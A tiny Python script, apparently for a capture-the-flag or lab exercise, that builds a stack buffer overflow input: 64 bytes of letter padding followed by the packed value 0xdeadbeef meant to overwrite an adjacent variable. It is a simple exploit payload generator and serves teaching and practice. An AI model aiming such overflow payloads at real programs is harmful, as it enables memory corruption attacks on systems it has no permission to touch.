import string
import struct

pad = ""
for i, c in enumerate(string.ascii_uppercase):
    pad += c * 4
    if (int(i) + 1) * 4 == 64:
        break

cmpp = struct.pack("I",0xdeadbeef)

payload = pad + cmpp

print(payload)
